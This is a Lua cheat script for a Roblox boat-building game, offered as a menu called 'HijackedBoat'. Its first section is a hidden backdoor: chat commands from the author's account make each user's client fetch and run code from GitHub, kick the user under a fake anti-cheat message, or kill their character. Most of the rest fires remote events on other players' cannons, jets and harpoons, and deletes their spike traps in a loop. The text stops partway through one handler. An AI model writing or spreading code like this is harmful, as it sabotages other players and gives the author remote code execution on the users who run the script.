--restart
local function onChatMessage(message, plr)
    if plr then
        if message:match(";restart") and plr.Name == "GuestNoob101013" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/WasiTC/HijackedBoat/refs/heads/main/HijackedBoat.lua"))()
        end
    end
end

for _,v in ipairs(game.Players:GetPlayers()) do
  v.Chatted:Connect(function(m) onChatMessage(m, v) end)
end
game.Players.PlayerAdded:Connect(function(v) v.Chatted:Connect(function(m) onChatMessage(m, v) end) end)

--kick
local function onChatMessage(message, plr)
    if plr then
        if message:match(";kickusers") and plr.Name == "GuestNoob101013" then
            game.Players.LocalPlayer:Kick("Anti-Cheat: You were kicked for exploiting. | Cheat Detected: HijackedBoat")
        end
    end
end

for _,v in ipairs(game.Players:GetPlayers()) do
  v.Chatted:Connect(function(m) onChatMessage(m, v) end)
end
game.Players.PlayerAdded:Connect(function(v) v.Chatted:Connect(function(m) onChatMessage(m, v) end) end)

--reset
local function onChatMessage(message, plr)
    if plr then
        if message:match(";resetusers") and plr.Name == "GuestNoob101013" then
            game.Players.LocalPlayer.Character.Humanoid.Health = 0
        end
    end
end

for _,v in ipairs(game.Players:GetPlayers()) do
  v.Chatted:Connect(function(m) onChatMessage(m, v) end)
end
game.Players.PlayerAdded:Connect(function(v) v.Chatted:Connect(function(m) onChatMessage(m, v) end) end)

--insta load
local function onChatMessage(message, plr)
    if plr then
        if message:match(";toggleIL") and plr.Name == "GuestNoob101013" then
            if game:GetService('Players').LocalPlayer == its_jenniseplayz then workspace:WaitForChild("InstaLoadFunction"):InvokeServer() end
        end
    end
end

for _,v in ipairs(game.Players:GetPlayers()) do
  v.Chatted:Connect(function(m) onChatMessage(m, v) end)
end
game.Players.PlayerAdded:Connect(function(v) v.Chatted:Connect(function(m) onChatMessage(m, v) end) end)

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local MainWindow = Rayfield:CreateWindow({
   Name = "🚤 HijackedBoat 🚤",
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "Loading...",
   LoadingSubtitle = "by GuestNoob101013",
   Theme = "Amethyst", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = HijackedBoat, -- Create a custom folder for your hub/game
      FileName = "PlrData"
   },

   Discord = {
      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Untitled",
      Subtitle = "Key System",
      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

Rayfield:Notify({
   Title = "Execution Status",
   Content = "Execution successful!",
   Duration = 6.5,
   Image = "check",
})

local ParasiteTab = MainWindow:CreateTab("🦠 Parasite", nil) -- Title, Image
local ParasiteSection = ParasiteTab:CreateSection("Parasite Controls")

local RemoveLagInput = ParasiteTab:CreateInput({
   Name = "[Anti-Weapon Lag] Enter the name of the person lagging the server",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
   while true do
    local targetplr = Text
    local baseNames = {"SpikeTrap"}
    
    local blocksFolder = workspace:WaitForChild("Blocks")
    local playerFolder = blocksFolder:WaitForChild(targetplr)
    
    -- First: Rename duplicates to ensure unique names
    local nameTracker = {}
    for _, item in ipairs(playerFolder:GetChildren()) do
        for _, baseName in ipairs(baseNames) do
            if item.Name == baseName then
                local count = nameTracker[baseName] or 1
                item.Name = baseName .. tostring(count)
                nameTracker[baseName] = count + 1
            end
        end
    end
    
    -- Second: Destroy ALL items (original + renamed)
    for _, item in ipairs(playerFolder:GetChildren()) do
        for _, baseName in ipairs(baseNames) do
            if item.Name:match("^" .. baseName .. "%d*$") then
                item:Destroy()
                break -- Stop checking other names once destroyed
            end
        end
    end
    task.wait(0.01)
end
   end,
})

local CannonsInput = ParasiteTab:CreateInput({
   Name = "Cannons",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
   local targetplr = Text
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
                local Text = "Username"
            end
local baseName = "Cannon"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local RedJetInput = ParasiteTab:CreateInput({
   Name = "Red Jet",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
   local targetplr = Text
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
local baseName = "JetTurbine"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local PurpleJetInput = ParasiteTab:CreateInput({
   Name = "Purple Jet",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "SonicJetTurbine"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local SnowJetInput = ParasiteTab:CreateInput({
   Name = "Snow Jet",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
   local targetplr = Text
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
local baseName = "JetTurbineWinter"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local RedThrusterInput = ParasiteTab:CreateInput({
   Name = "Ultra Thruster",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "UltraThruster"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local ThrusterInput = ParasiteTab:CreateInput({
   Name = "Regular Thruster",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "Thruster"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local MegaThrusterInput = ParasiteTab:CreateInput({
   Name = "Mega Thruster",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "MegaThruster"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local SnowThrusterInput = ParasiteTab:CreateInput({
   Name = "Winter Thruster",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "WinterThruster"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local HalloweenThrusterInput = ParasiteTab:CreateInput({
   Name = "Halloween Thruster",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "HalloweenThruster"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local GoldHarpoonInput = ParasiteTab:CreateInput({
   Name = "Golden Harpoon",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "HarpoonGold"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local BlueHarpoonInput = ParasiteTab:CreateInput({
   Name = "Blue Harpoon",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "Harpoon"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local DragonHarpoonInput = ParasiteTab:CreateInput({
   Name = "Dragon Harpoon",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "HarpoonDragon"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local CandyCaneHarpoonInput = ParasiteTab:CreateInput({
   Name = "Candy Cane Harpoon",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "DualCaneHarpoon"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local RegularFireworkInput = ParasiteTab:CreateInput({
   Name = "Regular Firework",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "Firework"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local FireworkAInput = ParasiteTab:CreateInput({
   Name = "Firework A",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "FireworkA"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
    local count = nameTracker[baseName] or 1
    
    if count == 1 then
        -- First occurrence, mark the name as used
        nameTracker[baseName] = 2
    else
        -- Subsequent occurrences, append number
        item.Name = baseName .. tostring(count)
        nameTracker[baseName] = count + 1
    end
end

-- Activate original Cannon first if it exists
local baseCannon = playerFolder:FindFirstChild(baseName)
if baseCannon then
    local pPart = baseCannon:FindFirstChild("PPart")
    if pPart then
        local remote = pPart:FindFirstChild("ActivateRemote")
        if remote then
            remote:FireServer()
        end
    end
end

-- Activate numbered cannons starting from 2
for i = 2, 1000 do
    local cannonName = baseName .. tostring(i)
    local numberedCannon = playerFolder:FindFirstChild(cannonName)
    
    if numberedCannon then
        local pPart = numberedCannon:FindFirstChild("PPart")
        if pPart then
            local remote = pPart:FindFirstChild("ActivateRemote")
            if remote then
                remote:FireServer()
                task.wait(0.01) -- Optional safety delay
            end
        end
    end
end
   end,
})

local FireworkBInput = ParasiteTab:CreateInput({
   Name = "Firework B",
   CurrentValue = "",
   PlaceholderText = "Username",
   RemoveTextAfterFocusLost = false,
   Flag = nil,
   Callback = function(Text)
local kicktarget = game.Players.LocalPlayer
if Text == "GuestNoob101013"
                then kicktarget:Kick("Unable to bypass connection firewall")
            end
   local targetplr = Text
local baseName = "FireworkB"

local blocksFolder = workspace:WaitForChild("Blocks")
local playerFolder = blocksFolder:WaitForChild(targetplr)

local wsandblocks = game.Workspace.Blocks
local folder = wsandblocks:WaitForChild(targetplr)
local nameTracker = {}

-- Loop through all items in the folder (except this script)
for _, item in ipairs(folder:GetChildren()) do
    if item == script then continue end -- Skip the script itself
    
    local baseName = item.Name
